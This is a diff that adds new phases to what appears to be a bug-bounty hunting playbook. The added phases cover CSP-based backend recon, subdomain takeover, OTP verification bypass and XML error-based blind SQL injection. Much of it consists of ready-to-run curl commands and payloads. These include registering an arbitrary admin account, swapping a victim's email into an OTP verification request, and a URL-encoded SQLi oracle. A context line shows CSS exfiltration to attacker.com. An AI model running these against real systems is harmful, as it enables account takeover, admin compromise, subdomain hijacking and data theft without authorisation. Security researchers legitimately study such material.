@@ -7,8 +7,15 @@
 - oauth-security-auditor.md
 - parser-differential-tester.md
 - ai-self-validator.md
+- (OPTIONAL: route to `08-otp-auth-bypass.md` if OTP/2FA flow detected)
 
 **Expected Time:** 2-4 hours per target
+
+**New in 2026-05-25 update:**
+- Phase 0.5: CSP Header Recon (Entry #180)
+- Phase 2.6: Stateless Verification ID / OTP Bypass (Entry #178, #183)
+- Phase 3.5: XML Error-Based Blind SQLi (Entry #179)
+- Phase 3.6: Subdomain Takeover (Entry #181)
 
 ---
 
@@ -69,6 +76,143 @@ grep -roh "https://[^\"']*" js_files/ | sort -u > extracted_endpoints.txt
 - Internal endpoints
 - OAuth client IDs
 - GraphQL schemas
+
+---
+
+## Phase 1.5: CSP Header Recon (NEW — Entry #180)
+
+**Critical recon step that most hunters miss.** CSP headers often reveal backend origins, staging environments, and admin panels not visible via other recon.
+
+### Step 1.5.1: Extract CSP Headers
+**Actions:**
+```bash
+# Get CSP from main domain
+curl -I https://target.com | grep -i "content-security-policy"
+
+# Capture full header for analysis
+curl -I https://target.com > csp_headers.txt
+```
+
+**Look for whitelisted origins in:**
+- `connect-src` — API endpoints, fetch destinations
+- `img-src` — image sources (often reveal CDN/backend)
+- `script-src` — JS sources (may include staging)
+- `frame-src` — iframe sources (may reveal admin panels)
+- `form-action` — form submission targets
+- `media-src` — media sources
+
+### Step 1.5.2: Enumerate Backend Origins
+**For each domain in CSP, check:**
+```bash
+# Is the origin accessible directly?
+curl -I https://example.sample.dev
+
+# Does it have admin endpoints?
+curl https://example.sample.dev/admin/
+curl https://example.sample.dev/admin/register
+curl https://example.sample.dev/install
+curl https://example.sample.dev/setup
+curl https://example.sample.dev/dashboard
+```
+
+**Common finds:**
+- CMS admin panels with open registration → full admin takeover
+- Staging environments with weaker auth
+- Backend APIs not intended for public access
+- Internal dashboards
+
+### Step 1.5.3: PoC Example
+```bash
+# 1. Main domain CSP reveals: connect-src 'self' https://example.sample.dev
+# 2. Visit the leaked origin
+curl https://example.sample.dev
+# 3. Find /admin/register endpoint
+curl https://example.sample.dev/admin/register
+# 4. Register arbitrary admin
+curl -X POST https://example.sample.dev/admin/register \
+  -H "Content-Type: application/json" \
+  -d '{"username":"attacker","password":"P@ss123!","email":"a@a.com"}'
+# 5. Login → full CMS compromise
+```
+
+**Impact:** Backend origins exposed via CSP = full admin takeover via open `/admin/register`, `/install`, or `/setup` endpoints.
+
+**Source:** Entry #180
+
+---
+
+## Phase 1.6: Subdomain Takeover (NEW — Entry #181)
+
+**Complete subdomain takeover playbook.** A company points a subdomain at Heroku/GitHub Pages/S3/Azure, stops using the service, but never deletes the DNS record. Claim that service name and own their subdomain.
+
+### Step 1.6.1: Enumerate Subdomains
+```bash
+# Combine multiple sources
+subfinder -d target.com -o subs_subfinder.txt
+amass enum -d target.com -o subs_amass.txt
+
+# Certificate Transparency logs (often leak forgotten subs)
+curl "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u > subs_crtsh.txt
+
+# Combine all
+cat subs_*.txt | sort -u > subs_all.txt
+```
+
+### Step 1.6.2: Find Dangling CNAMEs
+```bash
+# Resolve all and find CNAMEs
+dnsx -l subs_all.txt -cname -resp -o dangling_cnames.txt
+
+# Filter to only CNAMEs pointing to external services
+cat dangling_cnames.txt
+```
+
+**Common target services:**
+- Heroku (`*.herokuapp.com`)
+- GitHub Pages (`*.github.io`)
+- AWS S3 (`*.s3.amazonaws.com`)
+- Azure (`*.azurewebsites.net`, `*.cloudapp.net`)
+- Shopify (`*.myshopify.com`)
+- Fastly (`*.fastly.net`)
+- Pantheon (`*.pantheonsite.io`)
+- Tumblr (`*.tumblr.com`)
+- WordPress.com (`*.wordpress.com`)
+
+### Step 1.6.3: Fingerprint Dead Services
+```bash
+# Check with subzy
+subzy run --targets subs_all.txt
+
+# Or with nuclei
+nuclei -l subs_all.txt -t takeovers/ -o takeover_findings.txt
+```
+
+**Look for service-specific error messages:**
+- "There isn't a GitHub Pages site here"
+- "NoSuchBucket" (S3)
+- "No such app" (Heroku)
+
+### Step 1.6.4: Confirm Unclaimed
+- Visit the URL in browser → screenshot the error
+- Confirm DNS record still points there
+- Verify the service name isn't taken
+
+### Step 1.6.5: Claim the Subdomain
+**For each service:**
+- Heroku: `heroku create <service-name>` and deploy
+- GitHub Pages: create repo, enable Pages
+- S3: create bucket with exact name
+- Azure: create app service with exact name
+
+### Step 1.6.6: Report Around Impact
+**Always frame around impact (moves low → high):**
+- Phishing on trusted domain (`*.company.com` is trusted)
+- Cookie theft scoped to wildcard domain
+- Bypassing OAuth redirect_uri whitelists
+- Email spoofing (SPF/DKIM bypass via trusted subdomain)
+- Content injection visible to all users
+
+**Source:** Entry #181
 
 ---
 
@@ -141,6 +285,52 @@ input[value^="b"] { background: url(https://attacker.com/?c=b); }
 
 ---
 
+## Phase 2.5: OTP / Auth Bypass Testing (NEW — Entries #178, #183)
+
+**For any auth flow with OTP, magic link, email verification, or 2FA:** test the **stateless verificationId** pattern.
+
+> **For comprehensive OTP testing, route to `08-otp-auth-bypass.md`.** This is a quick on-target check.
+
+### Step 2.5.1: Identify Verification Flows
+- [ ] Login with email OTP
+- [ ] Email verification on signup
+- [ ] Password reset via OTP
+- [ ] 2FA / MFA challenge
+- [ ] "Verify OTP to Continue" pages
+
+### Step 2.5.2: Test Identity Field Swap
+```bash
+# Step 1: Initiate flow as attacker
+curl -X POST https://target.com/api/auth/email \
+  -H "Content-Type: application/json" \
+  -d '{"loginId":"attacker@you.com"}'
+# Save the verificationId
+
+# Step 2: Receive OTP at attacker's email
+# (intercept or read your own email)
+
+# Step 3: At verification, swap identity to victim
+curl -X PUT https://target.com/api/auth/email \
+  -H "Content-Type: application/json" \
+  -d '{
+    "loginId": "victim@target.com",
+    "otp_code": "123456",
+    "verificationId": "KC:6BE2..."
+  }'
+
+# Vulnerable: 200 OK + victim's tokens
+# Secure: 400/401 — verification doesn't match
+```
+
+### Step 2.5.3: Test OTP Bypass via Replay
+- Capture session cookie from OTP page
+- Replay GET request to authenticated endpoint directly
+- Check if server enforces OTP completion server-side
+
+**Source:** Entries #178, #183
+
+---
+
 ## Phase 3: Parser Differential Testing (30-60 min)
 
 **Activate:** `parser-differential-tester.md`
@@ -187,6 +377,41 @@ Handler uses extension → executes!
 %252F → %2F → /
 file.php%00.jpg
 ```
+
+### Step 3.5: XML Error-Based Blind SQLi (NEW — Entry #179)
+
+**For when standard SQLi tools fail (sqlmap false positive, no time-based oracle).** Make the database answer yes/no questions by crashing on purpose.
+
+**The Trick:**
+- WAF watches for SQL keywords, not XML errors
+- Wrap `CASE WHEN` around XML casts
+- If condition true: parses broken XML → throws HTTP 500
+- If condition false: parses clean XML → returns HTTP 200
+- sqlmap has no built-in vector for this
+
+**PoC pattern:**
+```sql
+-- TRUE branch: broken XML
+CASE WHEN (condition)
+  THEN XMLAgg(XMLElement("root", '<'))
+-- FALSE branch: clean XML
+  ELSE XMLAgg(XMLElement("root", '/'))
+END
+```
+
+**Test:**
+```bash
+# Try the technique in known-injectable param
+curl "https://target.com/api/search?q=test%27)%20AND%201=CASE%20WHEN%20(1=1)%20THEN%20XMLAgg(XMLElement(%22root%22,%20%27%3C%27))%20ELSE%20XMLAgg(XMLElement(%22root%22,%20%27/%27))%20END--"
+
+# Note 1=1 branch should return 500, 1=2 should return 200
+```
+
+**Use case:** When sqlmap reports false positive but you know injection exists. Build oracle character-by-character for database/schema extraction.
+
+**Recommended:** Use Claude Code mapped to DeepSeek V4 Pro for this technique (per original writeup — figured out the trick in 2 hours for $0.20).
+
+**Source:** Entry #179
 
 ---
 
@@ -371,3 +596,8 @@ echo "$(date) | target.com | OAuth redirect_uri bypass | CRITICAL | $14,000" >> 
 - Entry #53: OAuth Non-Happy Path ($3k)
 - Entry #57: Parser Differentials for XSS
 - Entry #5: AI Self-Validation (80% FP reduction)
+- **Entry #180: CSP Header Recon → CMS Admin Takeover**
+- **Entry #181: Subdomain Takeover Complete Playbook**
+- **Entry #178: OTP Bypass via Stateless Verification ID**
+- **Entry #183: Full ATO via OTP Verification Logic Flaw ($3k)**
+- **Entry #179: XML Error-Based Blind SQLi (DeepSeek V4 Pro trick)**
